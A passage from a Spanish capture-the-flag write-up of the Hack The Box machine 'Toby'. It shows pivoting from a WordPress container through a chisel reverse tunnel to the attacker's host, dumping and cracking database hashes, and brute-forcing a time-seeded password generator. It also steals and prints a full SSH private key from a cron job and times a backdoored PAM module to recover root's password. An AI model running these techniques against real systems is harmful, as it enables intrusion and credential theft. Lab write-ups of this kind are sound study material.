+www-data@wordpress:/tmp$ for port in $(cat /proc/net/tcp | awk '{print $2}' | awk '{print $2}' FS=":" | xargs); do echo "[+] Puerto $((0x$port))"; done | sort -u
+[+] Puerto 21
+[+] Puerto 34534
+[+] Puerto 34746
+[+] Puerto 39323
+[+] Puerto 43732
+[+] Puerto 43742
+[+] Puerto 49830
+[+] Puerto 49840
+[+] Puerto 57932
+[+] Puerto 58144
+[+] Puerto 59056
+[+] Puerto 80
+```
+
+No está ```MySQL``` abierto en esta máquina. Con ```dig```, aplico una consulta DNS para obtener la IP de la base de datos
+
+```null
+www-data@wordpress:/tmp$ dig mysql.toby.htb
+
+; <<>> DiG 9.11.5-P4-5.1+deb10u5-Debian <<>> mysql.toby.htb
+;; global options: +cmd
+;; Got answer:
+;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 46768
+;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 0
+
+;; QUESTION SECTION:
+;mysql.toby.htb.			IN	A
+
+;; ANSWER SECTION:
+mysql.toby.htb.		600	IN	A	172.69.0.102
+
+;; Query time: 0 msec
+;; SERVER: 127.0.0.11#53(127.0.0.11)
+;; WHEN: Sat Mar 11 14:35:37 UTC 2023
+;; MSG SIZE  rcvd: 62
+```
+
+Subo el ```chisel``` para tener conectividad con mi equipo, que lo ejecuto como cliente
+
+```null
+chisel server -p 1234 --reverse
+```
+
+Desde el contenedor me conecto
+
+```null
+www-data@wordpress:/tmp$ ./chisel client 10.10.16.9:1234 R:socks &>/dev/null & disown
+```
+
+Me conecto al ```MySQL```
+
+```null
+proxychains mysql -h 172.69.0.102 -uroot -p'OnlyTheBestSecretsGoInShellScripts'
+[proxychains] config file found: /etc/proxychains4.conf
+[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
+Welcome to the MariaDB monitor.  Commands end with ; or \g.
+Your MySQL connection id is 1021
+Server version: 8.0.26 MySQL Community Server - GPL
+
+Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.
+
+Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
+
+MySQL [(none)]> 
+```
+
+Listo las bases de datos
+
+```null
+MySQL [(none)]> show databases;
++--------------------+
+| Database           |
++--------------------+
+| gogs               |
+| information_schema |
+| mysql              |
+| performance_schema |
+| sys                |
+| wordpress          |
++--------------------+
+6 rows in set (0.119 sec)
+```
+
+De ```gogs```, puedo extraer el hash del usuario ```toby-admin```
+
+```null
+MySQL [wordpress]> use gogs;
+MySQL [gogs]> select email,passwd from user;
++---------------------+------------------------------------------------------------------------------------------------------+
+| email               | passwd                                                                                               |
++---------------------+------------------------------------------------------------------------------------------------------+
+| toby-admin@toby.htb | 8a611020ad6c56ffd791bf334d32d32748baae42975259607ce268c274a42958ad581686151fe1bb0b736370c82fa6afebcf |
++---------------------+------------------------------------------------------------------------------------------------------+
+1 row in set (0.667 sec)
+```
+
+De momento no se puede crackear, pero sí las del ```Wordpress```
+
+```null
+MySQL [gogs]> use wordpress;
+Reading table information for completion of table and column names
+You can turn off this feature to get a quicker startup with -A
+
+Database changed
+MySQL [wordpress]> select user_login,user_pass from wp_users;
++------------+------------------------------------+
+| user_login | user_pass                          |
++------------+------------------------------------+
+| toby       | $P$Bc.z9Qg7LCeVxEK8MxETkfVi7FdXSb0 |
+| toby-admin | $P$B3xHYCYdc8rgZ6Uyg5kzgmeeLlEMUL0 |
++------------+------------------------------------+
+2 rows in set (0.321 sec)
+```
+
+```null
+john -w:/usr/share/wordlists/rockyou.txt hashes
+Using default input encoding: UTF-8
+Loaded 2 password hashes with 2 different salts (phpass [phpass ($P$ or $H$) 256/256 AVX2 8x3])
+Cost 1 (iteration count) is 8192 for all loaded hashes
+Will run 8 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+tobykeith1       (toby-admin)
+```
+
+Listo la gran mayoría de las IPs a través de la tabla ARP
+
+```null
+www-data@wordpress:/var/www/html$ cat /proc/net/arp | grep -v "00:00:00:00:00:00" | awk '{print $1}' | grep 172 | xargs
+172.69.0.104 172.69.0.102 172.69.0.105 172.69.0.1 172.69.0.100
+```
+
+Subo un binario estático de nmap para escanear los puertos
+
+```null
+www-data@wordpress:/tmp$ ./nmap -p- --open --min-rate 5000 -n -Pn 172.69.0.104 172.69.0.102 172.69.0.105 172.69.0.1 172.69.0.100
+
+Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2023-03-11 15:08 UTC
+Unable to find nmap-services!  Resorting to /etc/services
+Cannot find nmap-payloads. UDP payloads are disabled.
+Nmap scan report for 172.69.0.104
+Host is up (0.000069s latency).
+Not shown: 65534 closed ports
+PORT   STATE SERVICE
+80/tcp open  http
+
+Nmap scan report for 172.69.0.102
+Host is up (0.00040s latency).
+Not shown: 65532 closed ports
+PORT      STATE SERVICE
+22/tcp    open  ssh
+3306/tcp  open  mysql
+33060/tcp open  unknown
+
+Nmap scan report for 172.69.0.105
+Host is up (0.00046s latency).
+Not shown: 65533 closed ports
+PORT     STATE SERVICE
+22/tcp   open  ssh
+3000/tcp open  unknown
+
+Nmap scan report for 172.69.0.1
+Host is up (0.00034s latency).
+Not shown: 65531 closed ports
+PORT      STATE SERVICE
+22/tcp    open  ssh
+80/tcp    open  http
+10022/tcp open  unknown
+10080/tcp open  amanda
+
+Nmap scan report for 172.69.0.100
+Host is up (0.00011s latency).
+Not shown: 65533 closed ports
+PORT     STATE SERVICE
+53/tcp   open  domain
+5380/tcp open  unknown
+
+Nmap done: 5 IP addresses (5 hosts up) scanned in 8.82 seconds
+```
+
+Añado en el ```BurpSuite``` una configuración para poder pasar por el tunel
+
+<img src="/writeups/assets/img/Toby-htb/13.png" alt="">
+
+Me abro la web de la ```172.69.0.4```
+
+<img src="/writeups/assets/img/Toby-htb/14.png" alt="">
+
+Hay una API por detrás
+
+<img src="/writeups/assets/img/Toby-htb/15.png" alt="">
+
+La contraseña que genera es dinámica
+
+```null
+for i in $(seq 1 4); do proxychains curl -s -X GET http://172.69.0.104/api/password 2>/dev/null | jq; done
+{
+  "password": "Lav99KYLK2hb82301TgdIbOKry2dace3"
+}
+{
+  "password": "7G18YDbHHjIm4ubBboWhoYSs73I4jsQW"
+}
+{
+  "password": "ovZMFynELbj5drxVGB21SgX5gWIviPL8"
+}
+{
+  "password": "IbJBfLPI2FSIYB9s11MOeZmdRXL5xVF4"
+}
+```
+
+Me conecto al ```WordPress```con las credenciales de antes
+
+<img src="/writeups/assets/img/Toby-htb/16.png" alt="">
+
+Se reutilizan para el Gogs
+
+<img src="/writeups/assets/img/Toby-htb/17.png" alt="">
+
+Puedo acceder a dos proyectos privados
+
+<img src="/writeups/assets/img/Toby-htb/18.png" alt="">
+
+En uno hay una archivo que puedo ver con ```sqlite3```
+
+<img src="/writeups/assets/img/Toby-htb/19.png" alt="">
+
+Y en el otro un script en python
+
+<img src="/writeups/assets/img/Toby-htb/20.png" alt="">
+
+```null
+git clone http://backup.toby.htb/toby-admin/personal-webapp
+Cloning into 'personal-webapp'...
+Username for 'http://backup.toby.htb': toby-admin
+Password for 'http://toby-admin@backup.toby.htb': 
+remote: Enumerating objects: 12, done.
+remote: Counting objects: 100% (12/12), done.
+remote: Compressing objects: 100% (12/12), done.
+remote: Total 12 (delta 5), reused 0 (delta 0)
+Unpacking objects: 100% (12/12), 4.32 KiB | 1.08 MiB/s, done.
+```
+
+Tiene dos commits
+
+```null
+git log
+commit 4dda252177ed70da1698dba380dbd2e521174dde (HEAD -> master, origin/master, origin/HEAD)
+Author: toby <toby@toby>
+Date:   Sat Aug 28 18:11:39 2021 +0000
+
+    Fix static files
+
+commit 7e56dd8aa6aed1ebf6e9b050af2c8a6e848c0107
+Author: toby <toby@toby>
+Date:   Sat Aug 28 18:10:20 2021 +0000
+```
+
+Aplico un diff para ver los cambios que se han hecho
+
+```null
+git diff 7e56dd8aa6aed1ebf6e9b050af2c8a6e848c0107
+diff --git a/app.py b/app.py
+index ef1d560..d47477c 100644
+--- a/app.py
++++ b/app.py
+@@ -9,7 +9,7 @@ import os
+ import ipaddress
+ from flask import *
+ 
+-app = Flask(__name__, static_url_path="/static")
++app = Flask(__name__, static_folder="", static_url_path="/static")
+ 
+ def validate_ip(ip):
+         try:
+@@ -42,6 +42,7 @@ def dbtest():
+ @app.route("/api/password")
+ def api_password():
+        chars = string.ascii_letters + string.digits
++       random.seed(int(time.time()))
+        password = ''.join([random.choice(chars) for x in range(32)])
+        return Response(json.dumps({"password": password}), mimetype="application/json")
+```
+
+En ```app.py``` hay varias funciones principales, entre ellas ```dbtest```. Todo esto está sincronizado con la web a la que me conecté por el tunel por SOCKS5
+
+```null
+def dbtest():
+        hostname = "mysql.toby.htb"
+        if "secretdbtest_09ef" in request.args and validate_ip(request.args['secretdbtest_09ef']):
+                hostname = request.args['secretdbtest_09ef']
+        username = os.environ['DB_USERNAME']
+        password = os.environ['DB_PASSWORD']
+    # specify mysql_native_password in case of server incompatibility 
+        process = Popen(['mysql', '-u', username, '-p'+password, '-h', hostname, '--default-auth=mysql_native_password', '-e', 'SELECT @@version;'], stdout=PIPE, stderr=PIPE)
+        stdout, stderr = process.communicate()
+        return (b'\n'.join([stdout, stderr])).strip()
+```
+
+Al tramitar una petición, recibo un error de ```MySQL```
+
+```null
+proxychains curl http://172.69.0.104/api/dbtest
+[proxychains] config file found: /etc/proxychains4.conf
+[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
+mysql: [Warning] Using a password on the command line interface can be insecure.
+ERROR 1045 (28000): Access denied for user 'jack'@'172.69.0.104' (using password: YES)
+```
+
+Está esperando un parámetro que se iguale a una IP
+
+```null
+proxychains curl 'http://172.69.0.104/api/dbtest?secretdbtest_09ef=10.10.16.9'
+[proxychains] config file found: /etc/proxychains4.conf
+[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
+mysql: [Warning] Using a password on the command line interface can be insecure.
+ERROR 2003 (HY000): Can't connect to MySQL server on '10.10.16.9:3306' (111)
+```
+
+Se intenta conectar a mi equipo por el puerto 3306, por lo que activo el demonio de ```MariaDB``` para que se pueda establecer la conexión y con ```Wireshark``` analizo los paquetes. Para que el puerto no se abra internamente, si no también externamente, modifico el archivo de configuración ```/etc/mysql/mariadb.conf.d/50-server.cnf```
+
+```null
+cat /etc/mysql/mariadb.conf.d/50-server.cnf | grep address
+#bind-address            = 127.0.0.1
+bind-address            = 10.10.16.9
+```
+
+```null
+systemctl enable mariadb
+systemctl start mariadb
+mysql &>/dev/null & disown
+```
+
+Recibo los paquetes
+
+<img src="/writeups/assets/img/Toby-htb/21.png" alt="">
+
+Hay un error en la resolución DNS
+
+<img src="/writeups/assets/img/Toby-htb/22.png" alt="">
+
+Como también buscaba al usuario ```jack```, creo uno en mi base de datos
+
+```null
+MariaDB [(none)]> create user 'jack@10.10.11.121' identified by 'jack';
+Query OK, 0 rows affected (0.001 sec)
+```
+
+Se leakea la contraseña hasheada
+
+<img src="/writeups/assets/img/Toby-htb/23.png" alt="">
+
+Pero es dínamica, cambia por cada vez, por lo que para poder crackearla necesito el salt
+
+<img src="/writeups/assets/img/Toby-htb/24.png" alt="">
+
+También se leakea el salt, aunque en este caso son dos
+
+<img src="/writeups/assets/img/Toby-htb/25.png" alt="">
+
+Con ```hascat``` listo los tipos de hashes de ```MySQL```
+
+```null
+hashcat --example-hashes | grep mysql
+  Example.Hash........: $mysql$A$005*F9CC98CE08892924F50A213B6BC571A2C11778C5*625479393559393965414D45316477456B484F41316E64484742577A2E3162785353526B7554584647562F
+  Example.Hash........: $mysqlna$2576670568531371763643101056213751754328*5e4be686a3149a12847caa9898247dcc05739601
+```
+
+Transformo los salts a hexadecimal, en una misma cadena
+
+<img src="/writeups/assets/img/Toby-htb/26.png" alt="">
+
+Me conecto por SSH a mi máquina host, y creo un hash que sea capaz de romper con ```hashcat```
+
+```null
+usuario@DESKTOP-5MC9541 C:\Users\Usuario\Documents\hashcat-6.2.6>echo '$mysqlna$3f294a7c505d604930522b7d577b274b267a5828*e9aaa4fa1ee7bd9db0ce1de4bf1942b160e2ca43' > hashes.txt
+```
+
+No es del todo suficiente, ya que se está tomando como semilla el tiempo actual
+
+```null
+@app.route("/api/password")
+def api_password():
+    chars = string.ascii_letters + string.digits
+    random.seed(int(time.time()))
+    password = ''.join([random.choice(chars) for x in range(32)])
+    return Response(json.dumps({"password": password}), mimetype="application/json")
+```
+
+En los comentarios hay pistas
+
+```null
+## API START
+
+# NOT FOR PROD USE, USE FOR HEALTHCHECK ON DB
+# 01/07/21 - Added dbtest method and warning message
+# 06/07/21 - added ability to test remote DB
+# 07/07/21 - added creds
+# 10/07/21 - removed creds and placed in environment
+```
+
+Si se han aplicado cambios en esas fechas, y la contraseña se generó en ese intervalo, puedo utilizar [epoch](https://www.epochconverter.com/) que corresponde al tiempo UNIX en un formato.
+
+<img src="/writeups/assets/img/Toby-htb/27.png" alt="">
+
+Lo que puedo hacer es crear contraseñas de forma manual desde ese tiempo hasta otro mucho más lejano, con el fin de encontrar la colisión
+
+```null
+import string, time, random
+
+def api_password():
+    for i in range(1625918400, 1626918400):
+        chars = string.ascii_letters + string.digits
+        random.seed(i)
+        password = ''.join([random.choice(chars) for x in range(32)])
+        print(password)
+
+
+if __name__ == '__main__':
+    api_password()
+```
+
+```null
+python3 generator.py > passwords
+```
+
+```null
+john -w:/home/rubbx/Desktop/HTB/Machines/Toby/personal-webapp/passwords hash
+Using default input encoding: UTF-8
+Loaded 1 password hash (mysqlna, MySQL Network Authentication [SHA1 32/64])
+Will run 8 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+4DyeEYPgzc7EaML1Y3o0HvQr9Tp9nikC (?)     
+1g 0:00:00:00 DONE (2023-03-11 18:14) 100.0g/s 1638Kp/s 1638Kc/s 1638KC/s 8SXqeGOgJ79vKjvJk6iRJUCKztyRW7yE..umiENbopZzjy6E5DAVHftTWYDkTvssZw
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed. 
+```
+
+Esta contraseña es válida para el usuario ```jack``` para el contenedor ```172.69.0.102```
+
+```null
+proxychains ssh jack@172.69.0.102
+[proxychains] config file found: /etc/proxychains4.conf
+[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
+The authenticity of host '172.69.0.102 (172.69.0.102)' can't be established.
+ED25519 key fingerprint is SHA256:8LD2haZ7Utos+qdQBZpPF+w4TgU9ijBNmp1Vh3gpwyk.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '172.69.0.102' (ED25519) to the list of known hosts.
+jack@172.69.0.102's password: 
+Linux mysql.toby.htb 5.4.0-89-generic #100-Ubuntu SMP Fri Sep 24 14:50:10 UTC 2021 x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+jack@mysql:~$ 
+```
+
+Subo el ```pspy``` por ```scp```
+
+```null
+proxychains scp /opt/pspy jack@172.69.0.102:/tmp/pspy
+```
+
+Encuentro una tarea CRON
+
+```null
+2023/03/11 18:25:01 CMD: UID=0    PID=23963  | runc init 
+2023/03/11 18:25:01 CMD: UID=0    PID=23970  | runc init 
+2023/03/11 18:25:01 CMD: UID=0    PID=23977  | sh -c mysqldump wordpress -uroot -pOnlyTheBestSecretsGoInShellScripts > /tmp/tmp.t2U0wh2LEM/backup.txt 
+2023/03/11 18:25:02 CMD: UID=0    PID=23978  | runc init 
+2023/03/11 18:25:02 CMD: UID=0    PID=23984  | runc init 
+2023/03/11 18:25:02 CMD: UID=0    PID=23990  | runc init 
+2023/03/11 18:25:02 CMD: UID=0    PID=23997  | scp -o StrictHostKeyChecking=no -i /tmp/tmp.t2U0wh2LEM/key /tmp/tmp.t2U0wh2LEM/backup.txt jack@172.69.0.1:/home/jack/backups/1678559102.txt 
+2023/03/11 18:25:03 CMD: UID=0    PID=23998  | runc init 
+```
+
+Se está almacenando contenido de manera temporal en un archivo en ```/tmp``` y también por ```scp``` una id_rsa a la máquina host. Utilizo un bucle infinito para encontrar la key y printearla por pantalla
+
+```null
+jack@mysql:/tmp$ while true; do find \-name key | xargs cat; done
+-----BEGIN OPENSSH PRIVATE KEY-----
+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
+0jZ2DP0AFwApsAAAAIcm9vdEBsYWIBAgM=
+-----END OPENSSH PRIVATE KEY-----
+```
+
+Me la transfiero a mi equipo y me conecto por SSH a la máquina víctima. Puedo ver la primera flag
+
+```null
+ssh -i id_rsa jack@10.10.11.121
+The authenticity of host '10.10.11.121 (10.10.11.121)' can't be established.
+ED25519 key fingerprint is SHA256:6riJf00HUUJr+EjVDhAyMXlOdNshRg1nMrX5bmj15lc.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.10.11.121' (ED25519) to the list of known hosts.
+Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-89-generic x86_64)
+
+jack@toby:~$ cat user.txt 
+dc08d2bc766c09d764c31915c9cb80b3
+```
+
+# Escalada
+
+De antes había dejado sin ver el arhivo ```.db``` del GOGS
+
+```null
+file support_system.db
+support_system.db: SQLite 3.x database, last written using SQLite version 3031001, file counter 3, database pages 3, cookie 0x2, schema 4, UTF-8, version-valid-for 3
+```
+
+Listo las tablas
+
+```null
+sqlite3 support_system.db
+SQLite version 3.40.1 2022-12-28 14:03:47
+Enter ".help" for usage hints.
+sqlite> .tables
+enc_meta     support_enc
+```
+
+Veo la estructura de las querys de como se crearon
+
+```null
+sqlite> .schema enc_meta
+CREATE TABLE enc_meta (
+					enc_key TEXT NOT NULL,
+					enc_iv TEXT NOT NULL,
+					enc_mode TEXT NOT NULL
+			);
+sqlite> .schema support_enc
+CREATE TABLE support_enc (
+					user TEXT NOT NULL,
+					support_submit_date INTEGER NOT NULL,
+					enc_blob TEXT NOT NULL,
+					enc_id INTEGER NOT NULL
+			);
+```
+
+Me traigo todo el contenido
+
+```null
+sqlite> select * from enc_meta;
+a3f2c368548d89ef3b81fe8a3cb75bd0a7365d60b4d0dfa9271f451bd71acbd5|c02905262cef2acd6a4002226f08be02|AES-CBC
+3c621a058be8c975fa95f7342832e0b3de6ff010514419c73c89da0b4449eec0|e716209dd10c3c4b32e5366372cfd917|AES-CBC
+bb89aa0bdc765946bba46514e8c5ea5cdade26485f5daee74b28225dd1e22339|6e9d20d41bcfd75e595dd0a196301715|AES-CBC
+sqlite> select * from support_enc;
+jack@toby.htb|1630176122|8dadda77134736074501b69eef9eb21ffdb5d4827565ab9ce50587349325ca27de85c94f318293df5c15d5177ecdcf4876f90b57cce5cd81a61275ac24971fe9|1
+jack@toby.htb|1630176122|740e66f585adae9d02d4003116ffb9082779744ab1c21c420c4dd2c1aa53f265db23958e2a6af21bed36d160844d7c99ce3ae0921b94476567148269c2ee93857e4f2798feb1118e9d17974ade1310a70ed6707acd3ccd92c211f30f86cc2febbf9ad2178b243a3cd4923529770f81dc76a923f39de902b08dfe8c97af64e2132e01b1e0ec62532604e2f932e6189c27a41cd833ee54536e515588d58deb4fa7ebddb9d6a827624aee18601b40f23c6002b40a2c99e417f8f26bb55783e38768|2
+jack@toby.htb|1630176122|6292b9d69fed2672735a1b66a2cffe65|3
+```
+
+Se está empleando AES y tengo todos los valores para hacer el decrypt
+
+<img src="/writeups/assets/img/Toby-htb/28.png" alt="">
+
+Estos serían todos los mensajes:
+
+```null
+This support system sucks, we need to change it!
+```
+
+```null
+Hi, my authentication has been really slow since we were attacked. I ran some scanners as my user but didn't find anything out of the ordinary. Can an engineer please come and look?
+```
+
+Esto puede deberse a que ha sido manipulado el ```pam.d```. Para poder saber cuales de ellos han sido modificados y no son los correspondientes a la instalación de un paquete, me puedo basar en el ```full-time```
+
+```null
+jack@toby:/etc/pam.d$ ls -la --full-time
+total 104
+drwxr-xr-x   2 root root 4096 2021-11-01 16:01:34.246113235 +0000 .
+drwxr-xr-x 105 root root 4096 2023-03-11 09:25:20.169530510 +0000 ..
+-rw-r--r--   1 root root  250 2018-07-24 12:41:23.000000000 +0000 atd
+-rw-r--r--   1 root root  384 2020-02-07 15:32:06.000000000 +0000 chfn
+-rw-r--r--   1 root root   92 2020-02-07 15:32:06.000000000 +0000 chpasswd
+-rw-r--r--   1 root root  581 2020-02-07 15:32:06.000000000 +0000 chsh
+-rw-r--r--   1 root root 1231 2021-10-13 15:20:51.964618733 +0000 common-account
+-rw-r--r--   1 root root 1341 2021-10-13 15:20:51.960605001 +0000 common-auth
+-rw-r--r--   1 root root 1464 2021-10-13 15:20:51.968632467 +0000 common-password
+-rw-r--r--   1 root root 1508 2021-10-13 15:20:51.968632467 +0000 common-session
+-rw-r--r--   1 root root 1435 2021-10-13 15:20:51.972646201 +0000 common-session-noninteractive
+-rw-r--r--   1 root root  606 2020-02-11 03:43:40.000000000 +0000 cron
+-rw-r--r--   1 root root 4120 2021-07-14 09:50:51.294641427 +0000 login
+-rw-r--r--   1 root root   92 2020-02-07 15:32:06.000000000 +0000 newusers
+-rw-r--r--   1 root root  520 2019-12-17 16:41:40.000000000 +0000 other
+-rw-r--r--   1 root root   92 2020-02-07 15:32:06.000000000 +0000 passwd
+-rw-r--r--   1 root root  270 2019-08-16 12:37:39.000000000 +0000 polkit-1
+-rw-r--r--   1 root root  143 2019-07-28 21:44:43.000000000 +0000 runuser
+-rw-r--r--   1 root root  138 2019-07-28 21:44:43.000000000 +0000 runuser-l
+-rw-r--r--   1 root root 2133 2020-05-29 07:37:09.000000000 +0000 sshd
+-rw-r--r--   1 root root 2265 2021-07-14 09:48:36.951038508 +0000 su
+-rw-r--r--   1 root root  239 2020-02-03 14:32:18.000000000 +0000 sudo
+-rw-r--r--   1 root root  137 2019-07-28 21:44:44.000000000 +0000 su-l
+-rw-r--r--   1 root root  317 2020-04-22 09:04:26.000000000 +0000 systemd-user
+-rw-r--r--   1 root root  119 2020-03-09 16:10:31.000000000 +0000 vmtoolsd
+```
+
+Aquellos que no tienen parte fraccional son originales
+
+```null
+jack@toby:/etc/pam.d$ ls -l --full-time | grep -v 000000000 | awk 'NF{print $NF}'
+common-account
+common-auth
+common-password
+common-session
+common-session-noninteractive
+login
+su
+```
+
+```null
+jack@toby:/etc/pam.d$ cat common-auth | grep -v "^#" | sed '/^\s*$/d'
+auth sufficient mypam.so nodelay
+account sufficient mypam.so nodelay
+auth	[success=1 default=ignore]	pam_unix.so nullok nodelay
+auth	requisite			pam_deny.so nodelay
+auth	required			pam_permit.so nodelay
+auth	optional			pam_cap.so nodelay
+```
+
+Se está incluyendo un archivo adicional, ```mypam.so```. Lo localizo y traigo a mi equipo para analizarlo con Ghidra
+
+```null
+jack@toby:/$ find \-name mypam.so 2>/dev/null 
+./usr/lib/x86_64-linux-gnu/security/mypam.so
+```
+
+Filtro por la cadena root dentro del análisis de la librería y encuentro una ruta sospechosa
+
+<img src="/writeups/assets/img/Toby-htb/29.png" alt="">
+
+En la función ```pam_sm_authenticate()```  se está importando un archivo
+
+<img src="/writeups/assets/img/Toby-htb/30.png" alt="">
+
+Pero no tengo capacidad de lectura
+
+```null
+jack@toby:/usr/lib/x86_64-linux-gnu/security$ cat /etc/.bd
+cat: /etc/.bd: Permission denied
+```
+
+Si el archivo está vacío, se termina la ejecución. En caso contrario, solicita un valor. Está comparando la contraseña que le introduzco como input con la que está en el archivo
+
+<img src="/writeups/assets/img/Toby-htb/31.png" alt="">
+
+Cuando es válido, se está haciendo una pequeña pausa, lo que hace que se pueda bruteforcear la contraseña de cualquier usuario. Creo una lista de caracteres
+
+```null
+jack@toby:/tmp$ python3 -c 'import string; print("\n".join(string.ascii_uppercase + string.ascii_lowercase + string.digits))' > characters
+```
+
+El script va a consistir en un cálculo del tiempo, no una automatización para obtener la contraseña. Hay otra validación que implica que la contraseña debe de tener 10 caracteres
+
+```null
+#!/bin/bash
+
+TIMEFORMAT=%E
+
+for character in $(cat characters); do
+
+password="" # Agregar manualmente la contraseña, caracter, por caracter
+	echo -n "$password$character: "
+	time printf "%-10s" $password$character | su root 2>/dev/null
+
+done
+```
+
+La credencial final es: ```root:TihPAQ4pse```. Puedo ver la segunda flag
+
+```null
+jack@toby:/tmp$ su root
+Password:
+root@toby:/tmp# cat /root/root.txt 
+45e537f2883d11b3125ff1a26cca005a
+```
